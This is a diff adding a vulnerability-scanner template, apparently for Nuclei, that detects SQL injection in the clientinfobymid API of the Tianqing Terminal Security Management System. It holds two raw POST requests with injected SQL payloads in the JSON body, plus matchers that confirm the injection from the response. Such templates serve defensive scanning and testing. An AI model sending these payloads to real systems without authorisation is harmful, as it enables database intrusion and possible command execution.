@@ -1,0 +1,46 @@
+id: tianqing-clientinfobymid-sqli
+info:
+  name: Tianqing Terminal Security Management System clientinfobymid SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an SQL injection vulnerability in the clientinfobymid method of the Tianqing Terminal Security Management System, which could lead to command execution on the server.
+  reference:
+    - https://www.qshu1.com/2022/04/11/%E5%A4%A9%E6%93%8ESQL%E6%B3%A8%E5%85%A5/
+  classification:
+    cvss-score: 10.0
+
+http:
+  - raw:
+      - |
+        POST /api/terminal/clientinfobymid HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"mids":{"1 ,:mid_1);select a -- aa":"","1":1}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"data\":[]"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /api/terminal/clientinfobymid HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"mids":{"1 ,:mid_1);select 'aaa' -- aa":"","1":1}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "data\":[{\"?column?\":\"aaa\"}"
+      - type: status
+        status:
+          - 200
